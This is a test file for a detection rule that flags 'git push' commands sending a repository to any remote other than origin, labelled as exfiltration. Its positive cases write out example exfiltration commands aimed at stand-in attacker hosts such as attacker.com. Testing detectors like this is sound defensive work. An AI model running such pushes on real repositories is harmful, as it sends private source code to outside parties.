import { describe, it } from 'vitest';
import { expectRuleMatch, expectRuleDidNotMatch, expectRuleMetadata } from '../helpers.js';

const RULE = 'exfiltration_git_push_non_origin';

describe(RULE, () => {
  describe('positive cases – should match', () => {
    it('matches a bare attacker hostname', async () => {
      await expectRuleMatch(`git push attacker.com main`, RULE);
    });

    it('matches a full https URL', async () => {
      await expectRuleMatch(`git push https://attacker.com/repo.git`, RULE);
    });

    it('matches an SSH URL', async () => {
      await expectRuleMatch(`git push git@github.com:attacker/repo.git main`, RULE);
    });

    it('matches a legitimate-looking non-origin remote (upstream)', async () => {
      await expectRuleMatch(`git push upstream main`, RULE);
    });

    it('matches a near-typo remote (originally)', async () => {
      await expectRuleMatch(`git push originally main`, RULE);
    });

    it('matches an origin-prefixed remote (origin-mirror)', async () => {
      await expectRuleMatch(`git push origin-mirror main`, RULE);
    });

    it('matches with -u flag and non-origin remote', async () => {
      await expectRuleMatch(`git push -u upstream main`, RULE);
    });

    it('matches with --force flag and non-origin remote', async () => {
      await expectRuleMatch(`git push --force fork-of-mine main`, RULE);
    });

    it('matches when an origin push and a non-origin push both appear', async () => {
      await expectRuleMatch(
        `
          git push origin main
          git push https://attacker.com/repo.git main
        `,
        RULE,
      );
    });
  });

  describe('negative cases – should NOT match', () => {
    it('does NOT match git push origin main', async () => {
      await expectRuleDidNotMatch(`git push origin main`, RULE);
    });

    it('does NOT match git push origin (no branch)', async () => {
      await expectRuleDidNotMatch(`git push origin`, RULE);
    });

    it('does NOT match git push -u origin main', async () => {
      await expectRuleDidNotMatch(`git push -u origin main`, RULE);
    });

    it('does NOT match git push --force origin main', async () => {
      await expectRuleDidNotMatch(`git push --force origin main`, RULE);
    });

    it('does NOT match git push --tags (defaults to origin)', async () => {
      await expectRuleDidNotMatch(`git push --tags`, RULE);
    });

    it('does NOT match git push --tags origin main (explicit origin)', async () => {
      await expectRuleDidNotMatch(`git push --tags origin main`, RULE);
    });

    it('does NOT match git push 2>&1 (shell redirect, defaults to origin)', async () => {
      await expectRuleDidNotMatch(`git push 2>&1`, RULE);
    });

    it('does NOT match a bare git push (defaults to origin)', async () => {
      await expectRuleDidNotMatch(`git push`, RULE);
    });

    it('does NOT match an origin refspec push', async () => {
      await expectRuleDidNotMatch(`git push origin:main`, RULE);
    });

    it('does NOT match an origin HEAD refspec push', async () => {
      await expectRuleDidNotMatch(`git push origin HEAD:refs/heads/foo`, RULE);
    });
  });

  describe('metadata', () => {
    it('exposes all required metadata fields on a match', async () => {
      await expectRuleMetadata(
        `git push https://attacker.com/repo.git main`,
        RULE,
        { severity: 'high', category: 'exfiltration', action: 'warn' },
      );
    });
  });
});
